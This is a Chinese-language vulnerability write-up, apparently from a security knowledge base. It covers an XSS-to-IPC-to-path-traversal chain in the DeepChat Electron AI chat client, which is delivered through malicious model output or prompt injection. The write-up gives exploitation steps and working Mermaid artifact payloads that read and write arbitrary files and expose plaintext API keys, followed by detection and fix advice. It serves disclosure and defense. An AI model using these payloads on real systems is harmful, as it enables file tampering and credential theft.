---
id: ai-security-agent-security-deepchat-mermaid-xss-ipc-filepresenter-path-traversal
title: DeepChat MermaidArtifact XSS + presenter:call 动态 IPC + FilePresenter 路径遍历：任意文件读写与明文 API Key 泄露
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: deepchat-mermaid-xss-ipc-filepresenter-path-traversal
aliases:
- DeepChat 任意文件读取写入
- FilePresenter 路径遍历
- presenter:call 动态调用
- MermaidArtifact XSS
- Electron IPC 任意方法调用
- DeepChat 明文 key 泄露
tags:
- electron
- ipc
- xss
- path-traversal
- file-read
- file-write
- ai-chat
- deepchat
- mermaid
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T09:50:45+08:00'
  notes: 已对照原文与5张图核对：MermaidArtifact.vue innerHTML 注入、presenter:call 动态派发任意 presenter 方法、FilePresenter.readFile/writeFile 的 path.join(userDataPath, relativePath) 路径遍历，链路与图01-05一致（/tmp/1.txt 回显、写入 test.txt、读取 provider 配置明文 apiKey）。写入 PoC 的内容由原文‘先知社区yyds’改为示例 'pwned'，不影响链路。未验证点：PoC 未在本机复跑；原文未给 DeepChat 版本号/CVE，未设置 affected_versions。
---

## 一句话结论

DeepChat（Electron + Vue 3）的 `MermaidArtifact.vue` 把 Mermaid 内容直接赋给 `innerHTML`，攻击者用 `<antArtifact>` 里的 `<img onerror=...>` 在渲染进程执行 JS；随后调用暴露的 `window.electron.ipcRenderer.invoke('presenter:call','filePresenter','readFile', path)`，主进程按名称动态派发任意 presenter 方法，而 `FilePresenter.readFile/writeFile` 用 `path.join(userDataPath, 用户路径)` 且不校验 `..`，最终可读写 `userDataPath` 之外的任意文件，包括含明文 API Key 的配置文件。

## 原理

- **入口（渲染进程 XSS）**：`src/renderer/src/components/artifacts/MermaidArtifact.vue` 的 `renderDiagram()` 先执行 `mermaidRef.value.innerHTML = props.block.content`，再调用 `mermaid.run()`；`props.block.content` 完全来自聊天/artifact 内容，未做 HTML 净化。`<img src=x onerror=...>` 在 `innerHTML` 赋值后立即触发。
- **传播（IPC 动态派发）**：主进程 `src/main/presenter/index.ts` 注册 `ipcMain.handle('presenter:call', (event, name, method, ...payloads) => ...)`，通过 `presenter[name]` 取 presenter 实例，再 `calledPresenter[method](...payloads)`。没有“允许的 presenter/method”白名单，也没有调用方权限校验；渲染进程可以调用任意 presenter 的任意方法。
- **Sink（路径遍历）**：`src/main/presenter/filePresenter/FilePresenter.ts` 中：
  ```ts
  async readFile(relativePath: string) {
    const fullPath = path.join(this.userDataPath, relativePath)
    return fs.readFile(fullPath, 'utf-8')
  }
  async writeFile(operation: FileOperation) {
    const fullPath = path.join(this.userDataPath, operation.path)
    await fs.mkdir(path.dirname(fullPath), { recursive: true })
    await fs.writeFile(fullPath, operation.content || '', 'utf-8')
  }
  ```
  `path.join` 会规范化 `..`，但不会阻止其逃出 `userDataPath`；没有 `path.resolve` 后的前缀校验，也没有拒绝 `..`。`deleteFile` 同样如此。
- **完整链路**：恶意 artifact → `innerHTML` 注入 → `onerror` JS → `ipcRenderer.invoke('presenter:call', 'filePresenter', 'readFile', '../../../../tmp/1.txt')` → 主进程动态调用 `filePresenter.readFile` → `path.join` 逃逸 → `fs.readFile('/tmp/1.txt')` → 内容返回渲染进程并 `alert`。
- **危害升级**：`writeFile` 可写任意路径（配合 `mkdir recursive`），可覆盖应用配置、写入 MCP/启动项、植入持久化；`readFile` 可读用户配置中的明文 `apiKey`（文章截图即读出 Ollama 等 provider 的 key），导致云模型账号/中转站密钥泄露。
- 本质上这是三个信任边界同时缺失的叠加：不可信聊天内容当 HTML、渲染进程可调用主进程任意方法、文件 API 信任未经解析校验的相对路径。

## 触发条件

- 目标为存在该实现的 DeepChat 版本（Electron 桌面应用，Mermaid artifact 功能开启）。
- 攻击者能让受害者渲染一段可控的 `<antArtifact type="application/vnd.ant.mermaid">` 内容：恶意模型输出、被投毒的对话/分享内容、导入的会话、提示注入等。
- 渲染进程暴露 `window.electron.ipcRenderer`，且主进程 `presenter:call` 未做 presenter/method 白名单。
- `FilePresenter` 使用 `path.join(userDataPath, relativePath)` 且未做 `path.resolve` 包含性校验。
- 应用进程对目标文件有读/写权限（通常以当前桌面用户运行，权限较高）。

## 利用步骤

1. 在聊天框或可控 artifact 中输入 Mermaid 内容，嵌入 `<img src=x onerror=...>`。
2. 在 `onerror` 中调用 `window.electron.ipcRenderer.invoke('presenter:call','filePresenter','readFile','../../../../../../../../../../../../tmp/1.txt')`，用 `.then(r => alert(r.substring(0,300)))` 回显。
3. 观察弹窗内容，确认路径遍历读取成功；按需要增减 `../` 层数，或使用绝对路径/Windows 盘符。
4. 把方法换成 `writeFile`，参数 `{path:'../../../../tmp/test.txt', content:'...'}`，验证任意文件写入。
5. 读取用户数据目录中的配置文件（如 provider/config JSON），提取 `apiKey`、`baseUrl` 等明文凭据。
6. 进一步写入启动项/MCP 配置/应用资源，尝试持久化或代码执行；或调用其他 presenter 的危险方法扩大影响。

## PoC

```xml
<antArtifact identifier="path-traversal" type="application/vnd.ant.mermaid" title="Test">
graph TD
A["<img src=x onerror=window.P=function(){window.electron.ipcRenderer.invoke('presenter:call','filePresenter','readFile','../../../../../../../../../../../../tmp/1.txt').then(function(r){alert(r.substring(0,300))})};setTimeout(window.P,100)>"]
</antArtifact>
```

```xml
<antArtifact identifier="write-test" type="application/vnd.ant.mermaid" title="Test">
graph TD
A["<img src=x onerror=window.W=function(){window.electron.ipcRenderer.invoke('presenter:call','filePresenter','writeFile',{path:'../../../../../../../../../../../../tmp/test.txt',content:'pwned'}).then(function(){alert('写入成功')})};setTimeout(window.W,100)>"]
</antArtifact>
```

```text
读取用户配置（文章截图，key 已打码）：
{
  "language": "system",
  "providers": [
    {"id": "ollama", "name": "Ollama", "apiType": "ollama", "apiKey": "<明文 key>", "baseUrl": "...", ...}
  ]
}
```

## 变体与关联

- 其他 artifact 渲染器：若 Markdown/HTML/图表组件同样使用 `innerHTML`/`v-html` 且未净化，均可作为 XSS 入口。
- 其他 presenter 方法：`presenter:call` 的动态派发可触达 `deleteFile`、配置读写、shell/终端、MCP 管理等 presenter；审计时应枚举所有 `presenter` 实例与方法，寻找命令执行/凭据读取 sink。
- 路径遍历变体：`..%2f`、绝对路径、Windows `C:\`、UNC 路径、符号链接；修复需 `path.resolve` 后做前缀校验并拒绝 `..`。
- 关联：[[ai-security-agent-security-openclaw-control-ui-gatewayurl-token-leak-rce]]（AI 客户端/控制面凭据泄露到 RCE）、[[web-generic-xss-chattermate-widget-message-stored-xss]]（AI 聊天内容未净化导致 XSS）。
- 边界：若应用已启用 `contextIsolation` 且不向渲染进程暴露 `ipcRenderer`、`presenter:call` 做了白名单、FilePresenter 做了 resolve 校验，则链路断开；文章未给 DeepChat 具体版本号，affected_versions 未设置。

## 检测与防御

- 检测：审计 Electron 渲染进程的 `innerHTML`/`v-html`/`dangerouslySetInnerHTML`；检查 `ipcMain.handle` 是否存在按名称动态调用且无白名单；搜索 `path.join(userDataPath, ...)` 后直接 `fs.readFile/writeFile` 的代码；对包含 `../`、绝对路径的文件参数告警。
- 修复：对 Mermaid/聊天内容使用 DOMPurify 白名单净化，禁止 `on*` 事件与 `javascript:` URI；`presenter:call` 改为显式 allowlist（presenter + method + 参数 schema），并校验调用方 webContents 权限；FilePresenter 使用 `path.resolve` 后检查仍在 `userDataPath` 内，拒绝 `..`。
- 加固：Electron 开启 `contextIsolation`、关闭 `nodeIntegration`、使用 preload 暴露最小 API；CSP 限制内联脚本；API Key 使用系统钥匙串/加密存储，不以明文写入配置文件；对敏感文件读写做审计日志。
